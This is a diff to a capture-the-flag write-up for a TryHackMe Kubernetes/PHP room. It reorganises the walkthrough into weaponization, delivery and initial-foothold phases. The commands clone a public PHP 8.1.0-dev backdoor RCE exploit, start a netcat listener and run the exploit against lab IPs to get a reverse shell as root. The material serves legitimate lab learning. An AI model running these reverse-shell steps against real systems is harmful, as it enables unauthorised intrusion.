@@ -10,7 +10,11 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 
 - Port Scanning → Service Discovery<br>
 - Web Vulberability Scanning<br>
-- Directory and File Enumeration</p>
+- Directory and File Enumeration<br>
+- Web Interface Inspection<br>
+- Weaponization<br>
+- Delivery and Execution<br>
+- Initial Foothold</p>
 
 
 <br>
@@ -372,8 +376,22 @@ Target: https://10.201.46.77:10250/
 Task Completed
 ```
 
+<h1 align="center">Web Interface Inspection</h1>
+<h2 align="center">25000</h2>
 
-<h2>:30679</h2>
+
+<br>
+<br>
+<br>
+<p>
+    
+- Viewed Page Source</p>
+
+```bash
+
+```
+
+<h2 align="center">30679</h2>
 
 <img width="936" height="247" alt="image" src="https://github.com/user-attachments/assets/4f702bb7-0012-4c1e-b2f6-e48501897789" />
 
@@ -399,37 +417,34 @@ There is no way they will break in this time!
         <marquee>Because I CONTROL the KUBE! I don't CUDDLE it!</marquee>
 ```
 
-
-<h2> ____</h2>
-
-```bash
-:~# searchsploit php 8.1.0-dev
-```
-
-```bash
-:~# searchsploit -m php/webapss/49933.py
-```
-
-<img width="1221" height="593" alt="image" src="https://github.com/user-attachments/assets/172dbbb4-c5e9-4f42-a769-97ea2bedc30f" />
-
-<br>
-<br>
-<br>
+<h1 align="center">Weaponization</h1>
+<p align="center">Downloaded  a repository</p>
 
 ```bash
 :~# git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 ```
+
+<p align="center">Reverse Shell Listener Setup</p>
 
 ```bash
 :~# nc -nlvp 9001
 Listening on 0.0.0.0 9001
 ```
 
+<p align="center">Exploit review</p>
+
+```bash
+python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <Attack_Port>
+```
+
+<h1 align="center">Delivery and Execution</h1>
+<p align="center">Exploit execution</p>
+
 ```bash
 :~# python3 revshell_php_8.1.0-dev.py http://10.201.49.183:30679 10.201.39.157 9001
 ```
 
-<h2>Shell as root@php-deploy-...</h2>
+<h1 align="center">Initial Foothold</h1>
 
 ```bash
 :~# nc -nlvp 9001
